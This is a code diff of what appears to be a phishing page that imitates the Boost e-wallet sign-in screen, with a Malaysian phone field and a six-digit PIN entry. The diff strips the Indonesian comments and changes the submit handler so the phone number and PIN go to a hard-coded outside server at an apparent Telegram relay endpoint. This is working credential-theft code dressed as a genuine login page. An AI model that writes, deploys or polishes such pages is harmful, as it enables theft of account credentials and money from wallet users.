@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to Boost</title>
-    <!-- Tailwind -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Hilangkan spinner pada input number */
         input[type="number"]::-webkit-inner-spin-button,
         input[type="number"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
@@ -22,7 +20,6 @@
     <header class="bg-[#ea0029] py-4 text-center">
         <img src="boost-logo-white.svg" alt="Boost" class="mx-auto w-20">
     </header>
-
     <main class="flex-grow flex items-center justify-center px-4 py-8">
         <div class="w-full max-w-sm bg-white rounded-2xl shadow-lg p-6">
             <div id="errorBlock" class="hidden mb-3 text-center bg-red-50 border border-red-200 py-2 text-red-700 px-4 rounded-lg">
@@ -31,7 +28,6 @@
             <h1 class="text-2xl font-bold text-gray-900 mb-1">Sign in to Boost</h1>
             <p class="text-gray-500 text-sm mb-6">Sign in with your registered Boost mobile number.</p>
 
-            <!-- Nomor Telepon -->
             <label for="phone" class="block text-sm font-semibold text-gray-700 mb-1">Mobile Number</label>
             <div class="flex items-center border-b-2 border-gray-200 focus-within:border-[#ea0029] transition">
                 <span class="text-gray-500 mr-2 font-medium">+60</span>
@@ -40,15 +36,11 @@
             </div>
             <p id="phoneError" class="text-red-500 text-xs mt-1 hidden">Please enter a valid mobile number</p>
 
-            <!-- 6-digit PIN (disembunyikan) -->
             <div class="mt-6">
                 <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit PIN</label>
-                <div class="flex justify-between gap-2" id="pinContainer">
-                    <!-- 6 input akan digenerate oleh JS -->
-                </div>
+                <div class="flex justify-between gap-2" id="pinContainer"></div>
             </div>
 
-            <!-- Tombol Submit -->
             <div class="mt-8 flex justify-end">
                 <button id="sendBtn" disabled class="bg-[#ea0029] disabled:opacity-50 text-white w-14 h-14 flex items-center justify-center rounded-full shadow-md hover:shadow-lg hover:scale-105 active:scale-95 transition-all">
                     <svg id="arrowIcon" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -61,18 +53,16 @@
     </main>
 
     <script>
-        // Hanya izinkan angka
         const onlyDigits = (val) => val.replace(/\D/g, '');
 
         // Generate 6 input PIN
         const pinContainer = document.getElementById('pinContainer');
         for (let i = 0; i < 6; i++) {
             const input = document.createElement('input');
-            input.type = 'password'; // PIN disembunyikan
+            input.type = 'password';
             input.inputMode = 'numeric';
             input.maxLength = 1;
             input.className = 'w-10 h-12 text-center text-xl font-semibold border-b-2 border-gray-300 rounded-md focus:border-[#ea0029] focus:outline-none';
-            input.dataset.index = i;
             pinContainer.appendChild(input);
         }
 
@@ -84,43 +74,32 @@
         const spinner = document.getElementById('loadingSpinner');
         const errorBlock = document.getElementById('errorBlock');
 
-        // Validasi nomor Malaysia (setelah +60, diawali 1, total 9-10 digit)
-        const validatePhone = () => {
-            const val = phoneInput.value.replace(/\D/g, '');
-            return /^1\d{8,9}$/.test(val);
-        };
-
-        // Validasi PIN semua terisi
+        const validatePhone = () => /^1\d{8,9}$/.test(phoneInput.value.replace(/\D/g, ''));
         const validatePin = () => Array.from(pinInputs).every(inp => inp.value !== '');
 
         function updateButton() {
             sendBtn.disabled = !(validatePhone() && validatePin());
         }
 
-        // Input nomor
-        phoneInput.addEventListener('input', function(e) {
+        phoneInput.addEventListener('input', function() {
             this.value = onlyDigits(this.value);
             phoneError.classList.toggle('hidden', validatePhone());
             updateButton();
         });
 
-        // Input PIN
         pinInputs.forEach((input, idx) => {
-            input.addEventListener('input', function(e) {
+            input.addEventListener('input', function() {
                 this.value = onlyDigits(this.value);
-                if (this.value && idx < pinInputs.length - 1) {
-                    pinInputs[idx + 1].focus();
-                }
+                if (this.value && idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
                 updateButton();
             });
             input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && !this.value && idx > 0) {
-                    pinInputs[idx - 1].focus();
-                }
+                if (e.key === 'Backspace' && !this.value && idx > 0) pinInputs[idx - 1].focus();
             });
         });
 
-        // Kirim login via proxy
+        const BACKEND_URL = 'https://boost-server-meng.onrender.com'; // Langsung tulis URL Render
+
         sendBtn.addEventListener('click', async function() {
             const phone = '+60' + phoneInput.value.replace(/\D/g, '');
             const pin = Array.from(pinInputs).map(i => i.value).join('');
@@ -131,7 +110,7 @@
             errorBlock.classList.remove('hidden');
 
             try {
-                const response = await fetch('/api/proxy', {
+                const response = await fetch(BACKEND_URL + '/api/telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone, pin, type: 'login' })
